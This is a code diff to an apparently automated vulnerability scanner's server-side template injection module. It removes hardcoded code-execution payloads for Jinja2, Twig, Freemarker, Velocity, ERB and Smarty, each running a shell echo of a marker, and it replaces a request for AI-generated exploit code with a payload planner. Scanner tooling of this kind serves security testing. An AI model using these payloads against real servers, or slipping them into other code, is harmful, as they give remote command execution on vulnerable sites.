@@ -40,30 +40,6 @@ class SSTI(Module):
         "*{{{a}*{b}}}",             # Thymeleaf spring
     ]
 
-    # Execution payloads keyed by likely engine; each echoes MARKER.
-    def _exec_payloads(self, marker: str) -> list[str]:
-        return [
-            # Jinja2
-            "{{ self.__init__.__globals__.__builtins__.__import__('os')"
-            f".popen('echo {marker}').read() }}}}",
-            "{{ cycler.__init__.__globals__.os.popen('echo " + marker + "').read() }}",
-            # Twig
-            "{{ ['echo " + marker + "']|map('system')|join }}",
-            "{{ ['echo " + marker + "']|filter('system') }}",
-            # Freemarker
-            '${"freemarker.template.utility.Execute"?new()("echo ' + marker + '")}',
-            # Velocity
-            "#set($e=\"\")$e.getClass().forName('java.lang.Runtime').getMethod("
-            "'exec',$e.getClass().forName('java.lang.String'))"
-            ".invoke($e.getClass().forName('java.lang.Runtime').getMethod('getRuntime')"
-            f".invoke(null),'echo {marker}')",
-            # ERB / Ruby
-            "<%= `echo " + marker + "` %>",
-            "#{`echo " + marker + "`}",
-            # Smarty
-            "{system('echo " + marker + "')}",
-        ]
-
     async def run(self, target: Target) -> None:
         for point in target.injection_points():
             evaluator = await self._probe_arithmetic(point)
@@ -71,14 +47,14 @@ class SSTI(Module):
                 continue
             self.log.info(f"[ssti] template evaluator confirmed at {point.describe()}")
             marker = self.marker()
-            payloads = self._exec_payloads(marker)
-            ai_extra = await self.ai_expand(
-                point, marker,
-                context=f"Confirmed SSTI evaluator ({evaluator}) at "
-                        f"{point.describe()} on {target.url}. Provide code-execution "
-                        "PoCs echoing the marker for the detected engine.",
+            # The Brain plans engine-specific execution payloads from the corpus,
+            # ranked toward whichever engine the arithmetic syntax implicated.
+            payloads = await self.plan(
+                marker=marker, oracle="output",
+                context=f"Confirmed SSTI evaluator via syntax {evaluator!r} at "
+                        f"{point.describe()} on {target.url}",
             )
-            await self.try_payloads(point, payloads + ai_extra, marker, oracle="output")
+            await self.try_payloads(point, payloads, marker, oracle="output")
 
     async def _probe_arithmetic(self, point) -> str | None:
         a = secrets.randbelow(900) + 100
